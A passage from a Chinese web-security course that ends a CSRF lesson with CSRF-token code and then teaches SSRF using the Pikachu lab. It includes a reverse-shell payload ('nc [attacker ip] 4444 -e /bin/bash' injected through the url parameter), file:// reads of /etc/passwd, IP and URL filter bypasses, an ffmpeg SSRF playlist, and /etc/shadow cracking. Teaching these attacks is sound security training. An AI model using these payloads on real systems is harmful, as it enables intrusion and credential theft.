<span style="color: #b22222;"> * length to hash required, int</span>
<span style="color: #b22222;"> *</span>
<span style="color: #b22222;"> * Returns:</span>
<span style="color: #b22222;"> * string, token</span>
<span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">public</span> <span style="color: #a020f0;">static</span> <span style="color: #228b22;">function</span> <span style="color: #0000ff;">generateAuthToken</span>()
{
        <span style="color: #b22222;">// </span><span style="color: #b22222;">todo - make this a member method / configurable</span>
        $randLength = 64;

        <span style="color: #b22222;">//</span><span style="color: #b22222;">if config tokenLength value is 0 or some non int</span>
        <span style="color: #a020f0;">if</span> (intval(self::$config[<span style="color: #ff0000; font-weight: bold;">'</span>tokenLength<span style="color: #ff0000; font-weight: bold;">'</span>]) == 0) {
                self::$config[<span style="color: #ff0000; font-weight: bold;">'</span>tokenLength<span style="color: #ff0000; font-weight: bold;">'</span>] = 32;      <span style="color: #b22222;">//</span><span style="color: #b22222;">set as default</span>
        }
        <span style="color: #b22222;">// </span><span style="color: #b22222;">&#20808;&#29992; radndom_bytes &#29983;&#25104;&#38543;&#26426;&#25968;&#65292;&#27809;&#26377;&#30340;&#35805;&#20877;&#35843;&#29992; openssl_random_pseudo_bytes&#65292;&#20877;&#27809;&#26377;&#30340;&#35805;&#23601;&#35843;&#29992; mt_rand</span>
        <span style="color: #a020f0;">if</span> (function_exists(<span style="color: #8b2252;">"random_bytes"</span>)) {
                $token = bin2hex(random_bytes($randLength));
        } elseif (function_exists(<span style="color: #8b2252;">"openssl_random_pseudo_bytes"</span>)) {
                $token = bin2hex(openssl_random_pseudo_bytes($randLength));
        } <span style="color: #a020f0;">else</span> {
                $token = <span style="color: #ff0000; font-weight: bold;">''</span>;
                <span style="color: #a020f0;">for</span> ($i = 0; $i &lt; 128; ++$i) {
                        $r = mt_rand (0, 35);
                        <span style="color: #a020f0;">if</span> ($r &lt; 26) {
                                $c = chr(ord(<span style="color: #8b2252;">'a'</span>) + $r);
                        } <span style="color: #a020f0;">else</span> { 
                                $c = chr(ord(<span style="color: #8b2252;">'0'</span>) + $r - 26);
                        }
                        $token .= $c;
                }
        }
        <span style="color: #a020f0;">return</span> substr($token, 0, self::$config[<span style="color: #ff0000; font-weight: bold;">'</span>tokenLength<span style="color: #ff0000; font-weight: bold;">'</span>]);  <span style="color: #b22222;">// </span><span style="color: #b22222;">&#25130;&#21462;&#25351;&#23450;&#38271;&#24230;&#30340; token</span>
}
</pre>
</div>

<p>
然后将生成的 Token 存储到 $_SESSION 和 $_COOKIE 中：
</p>

<div class="org-src-container">
<pre class="src src-java"><span style="color: #b22222;">/*</span>
<span style="color: #b22222;"> * Function: refreshToken</span>
<span style="color: #b22222;"> * Function to set auth cookie</span>
<span style="color: #b22222;"> *</span>
<span style="color: #b22222;"> * Parameters: </span>
<span style="color: #b22222;"> * void</span>
<span style="color: #b22222;"> *</span>
<span style="color: #b22222;"> * Returns: </span>
<span style="color: #b22222;"> * void</span>
<span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">public</span> <span style="color: #a020f0;">static</span> <span style="color: #228b22;">function</span> <span style="color: #0000ff;">refreshToken</span>()
{
        $token = self::generateAuthToken();
        <span style="color: #a020f0;">if</span> (!isset($_SESSION[self::$config[<span style="color: #ff0000; font-weight: bold;">'</span>CSRFP_TOKEN<span style="color: #ff0000; font-weight: bold;">'</span>]])
                || !is_array($_SESSION[self::$config[<span style="color: #ff0000; font-weight: bold;">'</span>CSRFP_TOKEN<span style="color: #ff0000; font-weight: bold;">'</span>]]))
                $_SESSION[self::$config[<span style="color: #ff0000; font-weight: bold;">'</span>CSRFP_TOKEN<span style="color: #ff0000; font-weight: bold;">'</span>]] = array();
        <span style="color: #b22222;">//</span><span style="color: #b22222;">set token to session for server side validation</span>
        array_push($_SESSION[self::$config[<span style="color: #ff0000; font-weight: bold;">'</span>CSRFP_TOKEN<span style="color: #ff0000; font-weight: bold;">'</span>]], $token);
        <span style="color: #b22222;">//</span><span style="color: #b22222;">set token to cookie for client side processing</span>
        setcookie(self::$config[<span style="color: #ff0000; font-weight: bold;">'</span>CSRFP_TOKEN<span style="color: #ff0000; font-weight: bold;">'</span>], 
                $token, 
                time() + self::$cookieExpiryTime,
                <span style="color: #ff0000; font-weight: bold;">''</span>,
                <span style="color: #ff0000; font-weight: bold;">''</span>,
                (array_key_exists(<span style="color: #ff0000; font-weight: bold;">'</span>secureCookie<span style="color: #ff0000; font-weight: bold;">'</span>, self::$config) ? (<span style="color: #228b22;">bool</span>)self::$config[<span style="color: #ff0000; font-weight: bold;">'</span>secureCookie<span style="color: #ff0000; font-weight: bold;">'</span>] : <span style="color: #008b8b;">false</span>));
}
</pre>
</div>

<p>
在 form 表单中插入隐藏的 Token 值：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">$hiddenInput = '&lt;input type="hidden" id="' . CSRFP_FIELD_TOKEN_NAME.'" value="' .self::$config['CSRFP_TOKEN'] .'"&gt;' .PHP_EOL;
    ......
$buffer = str_ireplace('&lt;/body&gt;', $hiddenInput . '&lt;/body&gt;', $buffer);
</pre>
</div>

<p>
用户提交表单后，会将上述 Token 一并提交，最后由服务器对比用户提交的
Token 与 $_SESSION 中存储的 Token：
</p>

<div class="org-src-container">
<pre class="src src-java"><span style="color: #b22222;">/*</span>
<span style="color: #b22222;"> * Function: isValidToken</span>
<span style="color: #b22222;"> * function to check the validity of token in session array</span>
<span style="color: #b22222;"> * Function also clears all tokens older than latest one</span>
<span style="color: #b22222;"> *</span>
<span style="color: #b22222;"> * Parameters: </span>
<span style="color: #b22222;"> * $token - the token sent with GET or POST payload</span>
<span style="color: #b22222;"> *</span>
<span style="color: #b22222;"> * Returns: </span>
<span style="color: #b22222;"> * bool - true if its valid else false</span>
<span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">private</span> <span style="color: #a020f0;">static</span> <span style="color: #228b22;">function</span> <span style="color: #0000ff;">isValidToken</span>($token) {
        <span style="color: #a020f0;">if</span> (!isset($_SESSION[self::$config[<span style="color: #ff0000; font-weight: bold;">'</span>CSRFP_TOKEN<span style="color: #ff0000; font-weight: bold;">'</span>]])) <span style="color: #a020f0;">return</span> <span style="color: #008b8b;">false</span>;
        <span style="color: #a020f0;">if</span> (!is_array($_SESSION[self::$config[<span style="color: #ff0000; font-weight: bold;">'</span>CSRFP_TOKEN<span style="color: #ff0000; font-weight: bold;">'</span>]])) <span style="color: #a020f0;">return</span> <span style="color: #008b8b;">false</span>;
        foreach ($_SESSION[self::$config[<span style="color: #ff0000; font-weight: bold;">'</span>CSRFP_TOKEN<span style="color: #ff0000; font-weight: bold;">'</span>]] as $key =&gt; $value) {
                <span style="color: #a020f0;">if</span> ($value == $token) {
                        <span style="color: #b22222;">// </span><span style="color: #b22222;">Clear all older tokens assuming they have been consumed</span>
                        foreach ($_SESSION[self::$config[<span style="color: #ff0000; font-weight: bold;">'</span>CSRFP_TOKEN<span style="color: #ff0000; font-weight: bold;">'</span>]] as $_key =&gt; $_value) {
                                <span style="color: #a020f0;">if</span> ($_value == $token) <span style="color: #a020f0;">break</span>;
                                array_shift($_SESSION[self::$config[<span style="color: #ff0000; font-weight: bold;">'</span>CSRFP_TOKEN<span style="color: #ff0000; font-weight: bold;">'</span>]]);
                        }
                        <span style="color: #a020f0;">return</span> <span style="color: #008b8b;">true</span>;
                }
        }
        <span style="color: #a020f0;">return</span> <span style="color: #008b8b;">false</span>;
}
</pre>
</div>

<p>
这就是 CSRF Token 生成与校验的思路，总结下，先由服务端生成随机数作为
Token，然后存储到 Session 中，不一定都非要存储到 Cookie中，然后在返回
给用户的表单中插入隐藏的 Token，用户提交后，由服务器来比对提交的 Token
与 Session 中的 Token 是否一致，以此判断请求是否合法。
</p>
</div>
</div>
</div>
<div id="outline-container-总结" class="outline-3">
<h3 id="总结">总结</h3>
<div class="outline-text-3" id="text-总结">
<p>
本讲主要介绍了 CSRF的产生原理、攻击手法、检测与防御方法，也列举了一些
真实存在的企业漏洞进行讲解。同时，我还介绍了第三方 CSRF 防御库
CSRFProtector，从源码的角度详细分析了 CSRF Token 生成与校验原理，这是
防御 CSRF 最有效也是最常用的方法。
</p>

<p>
理解 CSRF 的难点就在于，它不是为了窃取用户的登录凭证（cookie等），而是
直接利用用户已经登录过网站而留存在浏览器上的凭证，诱使用户访问恶意链接，
借助登录凭证去执行敏感操作，整个攻击过程是在用户的浏览器上完成的。
</p>

<p>
在下一讲，我将给你介绍 SSRF，它与 CSRF有一些相同的特点，但攻击目标不是
用户，而是服务器，期待在下一讲中与你相见。
</p>


<figure id="orgd9ac7e6">
<img src="./images/CgqCHl_8BT6AdNcCAAVd875SC3U237.png" alt="CgqCHl_8BT6AdNcCAAVd875SC3U237.png" width="80%">

</figure>
</div>
</div>
</section>
<section id="outline-container-h:fb629733-e08e-4fdd-ba62-4ceb29a96473" class="outline-2">
<h2 id="h:fb629733-e08e-4fdd-ba62-4ceb29a96473">SSRF 漏洞：外网隔离就绝对安全了吗</h2>
<div class="outline-text-2" id="text-h:fb629733-e08e-4fdd-ba62-4ceb29a96473">
<p>
上一讲我们介绍了 CSRF漏洞的产生原理、攻击手法、检测与防御手段，这一讲
开始我会向你介绍 SSRF。
</p>

<p>
从名字来看，SSRF 跟 CSRF就有点相近，其实它们的技术原理也有相似之处，但
攻击目标是完全不同的：SSRF是针对服务端的攻击。
</p>

<p>
想知道更具体的技术细节吗？跟我一块学习下面的内容吧！
</p>
</div>
<div id="outline-container-什么是-ssrf-漏洞" class="outline-3">
<h3 id="什么是-ssrf-漏洞">什么是 SSRF 漏洞？</h3>
<div class="outline-text-3" id="text-什么是-ssrf-漏洞">
<p>
SSRF（Server-Side Request Forgery，服务端请求伪造）是指攻击者向服务端
发送包含恶意 URL 链接的请求，借由服务端去访问此 URL，以获取受保护网络
内的资源的一种安全漏洞。SSRF 常被用于探测攻击者无法访问到的网络区域，
比如服务器所在的内网，或是受防火墙访问限制的主机。
</p>

<p>
SSRF 漏洞的产生，主要是因为在服务端的 Web 应用，需要从其他服务器拉取数
据资源，比如图片、视频、文件的上传/下载、业务数据处理结果，但其请求地
址可被外部用户控制。
</p>

<p>
请求地址被恶意利用的话，如下图所示，就能够以服务端的身份向任意地址发起
请求，如果是一台存在远程代码执行漏洞的内网机器，借助SSRF 漏洞就可以获
取该内网机器的控制权。
</p>


<figure id="orgbaa1678">
<img src="./images/CgpVE2AADgaALnqEAAU0JhFZzR0654.png" alt="CgpVE2AADgaALnqEAAU0JhFZzR0654.png" width="80%">

</figure>

<p>
图 1：SSRF 原理
</p>

<p>
所以说，在 SSRF 漏洞面前，哪怕是外网隔离的内网机器也无法保证绝对的安全。
</p>

<p>
以 Pikachu 靶场中的SSRF（curl）题目为例，如下图中，点击“累了吧，来读
一首诗吧”之后会发起以下请求：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://localhost:8080/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/vul/vul/ssrf/ssrf_info/info1.php
</pre>
</div>


<figure id="orgda981c0">
<img src="./images/Ciqc1F___H-AGVMFAACkzV98r_I798.png" alt="Ciqc1F___H-AGVMFAACkzV98r_I798.png" width="80%">

</figure>

<p>
图 2：Pikachu SSRF（curl）
</p>

<p>
<b>注意其中的 url 参数，</b> 如果我们将其修改为 “<a href="http://baidu.com">http://baidu.com</a>” ：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://localhost:8080/vul/ssrf/ssrf_curl.php?url=http://baidu.com
</pre>
</div>

<p>
那么它就会打开百度，这是服务端在向百度发起请求，并将返回内容回显到页面上的结果。
</p>


<figure id="orgcb9569a">
<img src="./images/Cip5yGAADhCAWSnNAAdaKZQ9ykM424.png" alt="Cip5yGAADhCAWSnNAAdaKZQ9ykM424.png" width="80%">

</figure>

<p>
图 3：利用 SSRF 向百度发起请求
</p>

<p>
查看 ssrf（curl）题目的 php源码，你会发现源码中本就有一些注释和利用思
路的测试：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php
    ......
    $PIKA_ROOT_DIR =  "../../";
    include_once $PIKA_ROOT_DIR.'header.php';

    //payload:
    //file:///etc/passwd  读取文件
    //http://192.168.1.15:22 根据 banner 返回,错误提示,时间延迟扫描端口

    if(isset($_GET['url']) &amp;&amp; $_GET['url'] != null){

        //接收前端 URL 没问题,但是要做好过滤,如果不做过滤,就会导致 SSRF
        $URL = $_GET['url'];
        $CH = curl_init($URL);
        curl_setopt($CH, CURLOPT_HEADER, FALSE);
        curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
        $RES = curl_exec($CH);
        curl_close($CH) ;
    //ssrf 的问题是:前端传进来的 url 被后台使用 curl_exec()进行了请求,然后将请求的结果又返回给了前端
    //除了 http/https 外,curl 还支持一些其他的协议 curl --version 可以查看其支持的协议,telnet
    //curl 支持很多协议，有 FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 以及 LDAP
        echo $RES;
    }
?&gt;
</pre>
</div>

<p>
漏洞的产生正是将 GET 参数 url 直接传递给 curl_exec 去访问，并调用 echo
将请求结果输出到页面，这正是设置 “url=<a href="http://baidu.com">http://baidu.com</a>” 后，会打开百度
的原因。
</p>
</div>
</div>
<div id="outline-container-ssrf-的危害" class="outline-3">
<h3 id="ssrf-的危害">SSRF 的危害</h3>
<div class="outline-text-3" id="text-ssrf-的危害">
<p>
基于前面介绍的 SSRF 原理，我们可以梳理出它可能出现的一些危害。
</p>

<ul class="org-ul">
<li><b>内网探测</b> ：对内网服务器、办公机进行端口扫描、资产扫描、漏洞扫描。</li>

<li><b>窃取本地和内网敏感数据</b> ：访问和下载内网的敏感数据，利用 File协议访
问服务器本地文件。</li>

<li><b>攻击服务器本地或内网应用</b> ：利用发现的漏洞进一步发起攻击利用。</li>

<li><b>跳板攻击</b> ：借助存在 SSRF漏洞的服务器对内或对外发起攻击，以隐藏自己
真实 IP。</li>

<li><b>绕过安全防御</b> ：比如防火墙、CDN（内容分发网络，比如加速乐、百度云加
速、安全宝等等）防御。</li>

<li><b>拒绝服务攻击</b> ：请求超大文件，保持链接 Keep-Alive Always。</li>
</ul>

<p>
你可以自己发挥脑洞去挖掘更多的可能的攻击场景，欢迎在留言区留言、讨论。
</p>
</div>
</div>
<div id="outline-container-常见的利用与限制绕过方法" class="outline-3">
<h3 id="常见的利用与限制绕过方法">常见的利用与限制绕过方法</h3>
<div class="outline-text-3" id="text-常见的利用与限制绕过方法">
<p>
说了这么多，那我们来看一下 SSRF 漏洞常见的利用方法和绕过限制的手段。
</p>
</div>
<div id="outline-container-利用支持的-url-schema-发起请求伪造" class="outline-4">
<h4 id="利用支持的-url-schema-发起请求伪造">1.利用支持的 URL Schema 发起请求伪造</h4>
<div class="outline-text-4" id="text-利用支持的-url-schema-发起请求伪造">
<p>
不仅仅只是常见的 http/https 协议，OWASP 曾整理过一份相对比较完整的 URL
Schema，这里我发出来供你参考一下：
</p>


<figure id="org2603768">
<img src="./images/CgqCHmAADh6AFbrRAAIMts5NwrM049.png" alt="CgqCHmAADh6AFbrRAAIMts5NwrM049.png" width="80%">

</figure>

<p>
图 4：常用于 SSRF 的 URL Scheme
</p>

<p>
在利用初期，你可以尝试下目标支持哪些 URL Schema，但有一点需要提醒下：*
有些应用会自定义一些 URL Schema，如果它支持本地或网络地址请求，要注意
避免遗漏掉*。
</p>
</div>
</div>
<div id="outline-container-读取本地文件" class="outline-4">
<h4 id="读取本地文件">2.读取本地文件</h4>
<div class="outline-text-4" id="text-读取本地文件">
<p>
从图 4 可以看到，除了 http/https 协议外，File也是各场景通用的伪协议，
利用它我们可以读取服务器的本地文件，比如/etc/passwd、
/proc/self/environ&#x2026;&#x2026;
</p>


<figure id="orge92054c">
<img src="./images/Ciqc1F___JyAXxb8AAFuJktUmQY503.png" alt="Ciqc1F___JyAXxb8AAFuJktUmQY503.png" width="80%">

</figure>

<p>
图 5：利用 SSRF 读取服务器本地文件
</p>
</div>
</div>
<div id="outline-container-攻击内网应用漏洞" class="outline-4">
<h4 id="攻击内网应用漏洞">3.攻击内网应用漏洞</h4>
<div class="outline-text-4" id="text-攻击内网应用漏洞">
<p>
前期可以利用 SSRF 漏洞对内网存活 IP或域名进行漏洞扫描。以前在公司就曾
遇到过这样一种情况：有些业务为了测试，在内网搭建了一些存在漏洞；或是有
漏洞没有及时修复，理由是在内网没影响。然后，有一些被外部SSRF 漏洞打进
来了，利用了 Struts2 漏洞控制了内网服务器。
</p>

<p>
比如内网有一台存在代码执行漏洞（<a href="http://192.168.x.x/vul.php?cmd=whoami">http://192.168.x.x/vul.php?cmd=whoami</a>）
的服务器未开外网，那么攻击者就可以利用SSRF 漏洞来攻击该内网服务器。以
Pikachu 靶场SSRF（curl）题目为例，可以构造如下链接来获取内网服务器的
shell控制权限：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://localhost:8080/vul/ssrf/ssrf_curl.php?url=http://192.168.x.x/vul.php?cmd=nc [攻击者 ip] 4444 –e /bin/bash;
</pre>
</div>
</div>
</div>
<div id="outline-container-绕过-ip-限制" class="outline-4">
<h4 id="绕过-ip-限制">4.绕过 IP 限制</h4>
<div class="outline-text-4" id="text-绕过-ip-限制">
<p>
有些网站可能会限制访问 IP，此时就可以尝试使用以下方法绕过：
</p>

<ul class="org-ul">
<li><b>IPv6 地址</b> ，如 <a href="http://2000::1:2345:6789:abcd">http://2000::1:2345:6789:abcd</a>；</li>

<li><b>十进制 IP</b> ，如 <a href="http://2130706433，相当于">http://2130706433，相当于</a> 127.0.0.1；</li>

<li><b>八进制 IP</b> ，如 <a href="http://0177.0.0.01，相当于">http://0177.0.0.01，相当于</a> 127.0.0.1；</li>

<li><b>十六进制 IP</b> ，如 <a href="http://0x7f.0x0.0x0.0x1，相当于">http://0x7f.0x0.0x0.0x1，相当于</a> 127.0.0.1；</li>

<li><b>多进制混合 IP</b> ，如 <a href="http://0177.0x0.0x0.1，相当于">http://0177.0x0.0x0.1，相当于</a> 127.0.0.1；</li>

<li><b>Localhost 替代</b> ，如<a href="http://127.127.127.127、http//0.0.0.0">http://127.127.127.127、http//0.0.0.0</a>、
<a href="http://127.1">http://127.1</a> 等。</li>
</ul>
</div>
</div>
<div id="outline-container-绕过-url-解析限制" class="outline-4">
<h4 id="绕过-url-解析限制">5.绕过 URL 解析限制</h4>
<div class="outline-text-4" id="text-绕过-url-解析限制">
<p>
如果存在 URL 限制，可以尝试以下方法绕过：
</p>

<ul class="org-ul">
<li><b>使用其他可用的协议</b> ，可参考图 4 进行测试；</li>

<li><p>
<b>URL 欺骗方式</b> ，如
</p>

<pre class="example" id="org8dbc159">
http://127.1.1.1@127.2.2.2、http://evil$google.com、http://google.com#@evil.com……
</pre></li>

<li><b>302 跳转切换协议</b> ，如请求头注入"Location: dict://lagou.com"</li>

<li><b>Unicode 转换</b> ，如 <a href="http://evil.c">http://evil.c</a> ℀.office.com</li>
</ul>

<p>
以上我向你介绍了一些常见的 SSRF限制策略与绕过手段，这些情况还是比较常
用的，甚至有些漏洞修复后，用上述方法又被绕过了。掌握限制绕过方法也是挖
掘SSRF 漏洞的必备技巧，下面，我再来带你了解下如何挖掘 SSRF 漏洞。
</p>
</div>
</div>
</div>
<div id="outline-container-ssrf-漏洞挖掘思路" class="outline-3">
<h3 id="ssrf-漏洞挖掘思路">SSRF 漏洞挖掘思路</h3>
<div class="outline-text-3" id="text-ssrf-漏洞挖掘思路">
<p>
要进行 SSRF 漏洞的防御，我们先要判断是否存在 SSRF 漏洞。
</p>
</div>
<div id="outline-container-如何判断是否存在-ssrf-漏洞" class="outline-4">
<h4 id="如何判断是否存在-ssrf-漏洞">1.如何判断是否存在 SSRF 漏洞</h4>
<div class="outline-text-4" id="text-如何判断是否存在-ssrf-漏洞">
<p>
判断 SSRF 漏洞是否存在，主要有以下 4 种方式：
</p>

<ul class="org-ul">
<li><b>回显判断</b> ：如图 3 那种有返回请求结果并会显示出来，这种比较好判断。</li>

<li><b>访问日志检查</b> ：伪造请求到自己控制的公网服务器，然后在服务器上查看
访问日志是否有来自漏洞服务器的请求，或者直接使用命令“nc -lvp”来监
听请求。</li>

<li><b>延时对比</b> ：对比访问不同 IP/域名的访问时长，比如对百度与Google（国
内访问受限）的访问时间，访问百度的时间通常比Google快，若是则可能存在
漏洞。</li>

<li><b>DNS 请求检测</b> ：自己搭建 DNS 服务器，或者利用网上的 DNSLog服务（比如
<a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a>），生成一个域名（l08bgh.dnslog.cn）用于伪造请求，
看漏洞服务器是否发起DNS 解析请求，若成功访问在 DNSLog.cn 上就会有解
析日志。</li>
</ul>

<p>
构建以下链接，访问后再 DSNLog 上就会看到相应的解析日志了：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://localhost:8080/vul/ssrf/ssrf_curl.php?url=http://l08bgh.dnslog.cn
</pre>
</div>


<figure id="org22a2caa">
<img src="./images/CgqCHmAADkGAIcZZAAMGZOUjpvY507.png" alt="CgqCHmAADkGAIcZZAAMGZOUjpvY507.png" width="80%">

</figure>

<p>
图 6：DNSLog 请求日志
</p>
</div>
</div>
<div id="outline-container-容易出现-ssrf-漏洞的业务场景" class="outline-4">
<h4 id="容易出现-ssrf-漏洞的业务场景">2.容易出现 SSRF 漏洞的业务场景</h4>
<div class="outline-text-4" id="text-容易出现-ssrf-漏洞的业务场景">
<p>
以上我向你介绍了 SSRF 的危害，哪些地方比较容易出现 SSRF
漏洞呢？我主要分了 4 个方面来说。
</p>

<ul class="org-ul">
<li><b>凡是能够对外发起网络请求的地方，且地址可被用户可控的，都有可能存在
SSRF 漏洞。</b> 比如 RSS 订阅、字幕下载、支持输入 URL的功能、嵌入远程图
片、收取第三方邮箱邮件。一些不明显的地方，可以通过爬包分析，从参数名
来猜测，比如url、domain、site、src、target 等常见关键词来做进一步地
测试验证。</li>

<li><b>文件处理功能。</b> 比如负责处理音视频的 ffmpeg，负责处理图片的
ImageMagic、处理办公文件的Office，PDF 文档解析功能，还有 XML解析器等
地方，尤其是 ffmpeg 和 ImageMagic，它们曾多次出现过 SSRF漏洞。<br>
ffmpeg 在解析 mp4 文件时就曾出现过以下漏洞，构造一个包含以下内容的
mp4文件，上传到支持音频解析的网站就可能造成 SSRF漏洞。 <b>这种应用漏洞
记得平时多收集，在实际渗透测试时非常有用</b> 。</li>
</ul>

<div class="org-src-container">
<pre class="src src-lang-java">#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,http://192.168.123.100:8080/1.html
#EXT-X-ENDLIST
</pre>
</div>

<ul class="org-ul">
<li><b>社交分享功能</b> ， 社交分享也是容易出现 SSRF 漏洞的地方。</li>

<li><b>信息采集功能</b> ，比如图片、文章收藏、网页快照、网页翻译、网页剪裁。</li>
</ul>

<p>
我这里只是列举一些常见的场景，很难完全覆盖 SSRF容易出现漏洞的场景，但
核心思路就是理解业务功能，判断其是否存在对外发起网络请求，若是存在就有
可能存在SSRF 漏洞，然后进一步实际验证下，可以用下面介绍的 Burp
Collaborator作验证。
</p>
</div>
</div>
</div>
<div id="outline-container-检测-ssrf-的通用方法和工具" class="outline-3">
<h3 id="检测-ssrf-的通用方法和工具">检测 SSRF 的通用方法和工具</h3>
<div class="outline-text-3" id="text-检测-ssrf-的通用方法和工具">
</div>
<div id="outline-container-方法burp-collaborator" class="outline-4">
<h4 id="方法burp-collaborator">1.方法：Burp Collaborator</h4>
<div class="outline-text-4" id="text-方法burp-collaborator">
<p>
这里我介绍个检测 SSRF的通用方法，无法是否有回显都适用的，也是我个人比
较喜欢用的，那就是 Burp Collaborator。BurpSuite 默认提供 Collaborator
Server 用于实现 DNS解析，在一些无回显的安全测试中，会将解析日志返回给
BurpSuite。
</p>

<blockquote>
<p>
不仅仅用于 SSRF，一些无回显的漏洞测试也同样适用，比如 SQL 注入。
</p>
</blockquote>


<figure id="org6ed92e7">
<img src="./images/Ciqc1F___M6AM-F0AAB4EJZT7Og734.png" alt="Ciqc1F___M6AM-F0AAB4EJZT7Og734.png" width="80%">

</figure>

<p>
图 7：BurpSuite 默认提供 Collaborator Server 作为 DNS 解析服务器
</p>

<p>
关于 Burp Collaborator 原理，我们可以看下面这张图：
</p>


<figure id="org3534133">
<img src="./images/Ciqc1F___NaAO7ZxAABr-AfFp10030.png" alt="Ciqc1F___NaAO7ZxAABr-AfFp10030.png" width="80%">

</figure>

<p>
图 8：Burp Collaborator 原理
</p>

<p>
图中可以看到，先利用 SSRF 漏洞让目标应用向 Burp 提供的 DNS 解析服务器
Burp Collaborator Server 发起请求，然后 Burp Collaborator Server会查询
对应的 DNS 请求记录并返回给 BurpSuite，从而帮助测试者判断 SSRF漏洞是否
存在。
</p>

<p>
仍以前面的靶场题目为例，打开 Burp Collaborator Client：
</p>


<figure id="org2aef308">
<img src="./images/Cip5yGAADl-ANvjXAALr6lgnhiU452.png" alt="Cip5yGAADl-ANvjXAALr6lgnhiU452.png" width="80%">

</figure>

<p>
图 9：选择菜单“Burp Collaborator client”
</p>


<figure id="orga0064f7">
<img src="./images/Ciqc1F___OaARRUKAAA1N0CwrBA260.png" alt="Ciqc1F___OaARRUKAAA1N0CwrBA260.png" width="80%">

</figure>

<p>
图 10：Burp Collaborator client
</p>

<p>
点击“Copy to clipboard”获取生成的域名，我这里生成的是
“c3g9ga6x5zdxijo5d3aifxv6nxtnhc.burpcollaborator.net”，我们就可以构
造如下利用链接：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://localhost:8080/vul/ssrf/ssrf_curl.php?url=http://c3g9ga6x5zdxijo5d3aifxv6nxtnhc.burpcollaborator.net
</pre>
</div>

<p>
访问后回到 Burp Collaborator client，点击“Poll now”就可以看到 DNS请
求记录，这说明存在 SSRF 漏洞。
</p>


<figure id="org3d6ee45">
<img src="./images/Ciqc1F___PCAJA70AABnCpr9zFk818.png" alt="Ciqc1F___PCAJA70AABnCpr9zFk818.png" width="80%">

</figure>

<p>
图 11：获得 DNS 请求日志证明存在 SSRF 漏洞
</p>

<p>
这个检测方法比较通用简单，且无须自己搭建 DNS服务器，非常方便，我强烈推
荐。
</p>
</div>
</div>
<div id="outline-container-工具ssrfmap" class="outline-4">
<h4 id="工具ssrfmap">2.工具：SSRFmap</h4>
<div class="outline-text-4" id="text-工具ssrfmap">
<p>
这里给大家介绍一款 SSRF检测工具：<a href="https://github.com/swisskyrepo/SSRFmap">SSRFmap</a>，利用它可检测与利用SSRF 漏洞，
同时它也整合了一些常用漏洞可以结合 SSRF 去利用，比如fastjson、mysql、
github的一些历史漏洞，还有端口扫描、读取文件等利用功能，都是实用的漏洞
利用能力。
</p>

<p>
使用上会比 Burp Collaborator 便捷，但检测能力上其实没有 Burp
Collaborator 那样准确，SSRFmap 有时会利用失败。所以个人推荐使用 Burp
Collaborator 用来检测 SSRF 是否存在，再使用 SSRFmap做一些漏洞利用，比
如读取敏感文件等操作。
</p>

<p>
SSRFmap 是以 HTTP 请求数据作为文件输入，使用命令如下：
</p>


<figure id="org52f0453">
<img src="./images/Ciqc1F___PiASgPlAAEZ_x3Bz0k961.png" alt="Ciqc1F___PiASgPlAAEZ_x3Bz0k961.png" width="80%">

</figure>

<p>
图 12：SSRFmap
</p>

<p>
用其自带的测试用例，试用下：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">FLASK_APP=data/example.py flask run &amp;
python ssrfmap.py -r data/request.txt -p url -m readfiles
</pre>
</div>

<p>
其中 data/request.txt 内容如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">POST /ssrf HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mysimple.ssrf/
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Connection: close
Upgrade-Insecure-Requests: 1
url=https%3A%2F%2Fwww.google.fr%
</pre>
</div>

<p>
它会读取很多敏感文件，比如 /etc/passwd、/etc/hosts：
</p>


<figure id="org1ae5d6f">
<img src="./images/CgqCHl___QOAXop9AAFeL92aWyk084.png" alt="CgqCHl___QOAXop9AAFeL92aWyk084.png" width="80%">

</figure>

<p>
图 13：利用 SSRFmap 读取本地文件
</p>

<p>
以上我们测试了，然后读取了敏感文件，然后好像就戛然而止了，读取之后就没
有下文了。比如你想破解主机密码，就可以读取文件/etc/shadow 以获得用户名
和密码密文，然后就可以用 john 去破解密码：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">$ sudo cat /etc/shadow
root:$6$TBFgG/seGvOG8nOp$LvZXXXXXXXENV2F6SEATplyE1QY33W2buEs10XLi.zQD8iwl.kCwsD.OMQ6WWkmUdu/9RPLHvLYSzMfcLj0:18446:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
……
</pre>
</div>

<p>
加密的密码具有固定格式：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">$id$salt$encrypted
</pre>
</div>

<ul class="org-ul">
<li>id：表示加密算法，1 代表 MD5，5 代表 SHA-256，6 代表 SHA-512。</li>

<li>salt：表示密码学中的 Salt，由系统随机生成 。</li>

<li>encrypted：表示密码的 hash。</li>
</ul>

<p>
冒号后面的数值是一些日期和密码修改间隔天数的信息，可以不用管，以上述示
例中root 账号为例：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">root:$6$TBFgG/seGvOG8nOp$LvZXXXXXXXENV2F6SEATplyE1QY33W2buEs10XLi.zQD8iwl.kCwsD.OMQ6WWkmUdu/9RPLHvLYSzMfcLj0
id=6，即使用SHA-512哈希算法
salt=TBFgG
